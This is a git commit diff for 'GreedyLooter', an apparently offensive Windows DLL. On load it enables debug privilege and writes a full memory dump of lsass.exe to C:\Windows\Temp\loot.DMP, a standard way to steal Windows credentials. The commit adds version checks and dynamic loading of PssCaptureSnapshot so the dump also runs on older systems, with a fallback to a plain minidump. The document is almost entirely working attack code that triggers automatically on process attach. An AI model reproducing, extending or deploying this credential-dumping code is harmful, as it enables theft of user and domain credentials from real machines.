a20361aaf607485a497a503fed7d8e08798b7319
Sam Wong <SamWong@cmail.carleton.ca>
2020-07-04 07:10:44 -0700

    Added version checking, and dynamic loading of psssnapshot functions to allow compatibility with older windows version.

--- GreedyLooter/dllmain.cpp
+++ GreedyLooter/dllmain.cpp
@@ -4,8 +4,34 @@
 
 // boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion
+EXTERN_C NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOEXW lpVersionInformation);
+
+// PssCaptureSnapshot typedef for GetProcAddress
+typedef DWORD(__cdecl *PPssCaptureSnapshot)(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HPSS*);
+// PssCaptureSnapshot typedef for GetProcAddress
+typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);
 
 const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot.DMP";
+
+// Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
+// true if versions satisfy minimum Major/Minor version for Server/DomainController or Workstation
+BOOL verifyRtlVersions(ULONG minMajorW, ULONG minMinorW, ULONG minMajorS, ULONG minMinorS) {
+	OSVERSIONINFOEXW osInfo;
+	// specifies OSVERSIONINFOW or OSVERSIONINFOEXW structure for RtlGetVersion
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+	RtlGetVersion(&osInfo);
+
+	if (osInfo.wProductType == VER_NT_WORKSTATION) {
+		if (osInfo.dwMajorVersion < minMajorW) return FALSE;
+		if (osInfo.dwMajorVersion == minMajorW && osInfo.dwMinorVersion < minMinorW) return FALSE;
+	}
+	else {
+		if (osInfo.dwMajorVersion < minMajorS) return FALSE;
+		if (osInfo.dwMajorVersion == minMajorS && osInfo.dwMinorVersion < minMinorS) return FALSE;
+	}
+	return TRUE;
+}
 
 // get Process ID by process name
 DWORD getPID(LPCWSTR procName = L"lsass.exe") {
@@ -59,10 +85,19 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
 
 // ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
 // capture process snapshot then minidump lsass from snapshot to file
+// Minimum support server: Windows Server 2012 R2
+// Minimum support client: Windows 8.1
 BOOL pssMiniDumpLoot() {
 	DWORD processId = getPID();
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	// load PssCaptureSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
+	PPssCaptureSnapshot pPCS;
+	pPCS = (PPssCaptureSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssCaptureSnapshot");
+	// load PssFreeSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
+	PPssFreeSnapshot pPFS;
+	pPFS = (PPssFreeSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssFreeSnapshot");
 
 	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
                             | PSS_CAPTURE_HANDLES
@@ -79,8 +114,9 @@ BOOL pssMiniDumpLoot() {
                             | PSS_CREATE_RELEASE_SECTION;
 	HPSS SnapshotHandle;
 	// capture snapshot of lsass process
-	DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
-	if (dwResultCode != ERROR_SUCCESS) return false;
+	DWORD dwResultCode = pPCS(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
+	//DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
+	if (dwResultCode != ERROR_SUCCESS) return FALSE;
 
 
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
@@ -90,11 +126,21 @@ BOOL pssMiniDumpLoot() {
 	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
 	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);
 
-	PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
+	pPFS(GetCurrentProcess(), SnapshotHandle);
+	//PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
 	CloseHandle(hFile);
 	CloseHandle(hProcess);
 
 	return cDump;
+}
+
+// if version is above minimum Windows 8.1, Windows Server 2012 R2 use pssMiniDumpLoot, else use miniDumpLoot
+BOOL dumpLoot() {
+	if (verifyRtlVersions(6, 3, 10, 0)==TRUE) {
+		return pssMiniDumpLoot();
+	}
+
+	return miniDumpLoot();
 }
 
 // ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
@@ -167,13 +213,12 @@ BOOL IsElevated() {
 	return fRet;
 }
 
-
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
 		setRtlSEDebug();
-		pssMiniDumpLoot();
+		dumpLoot();
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
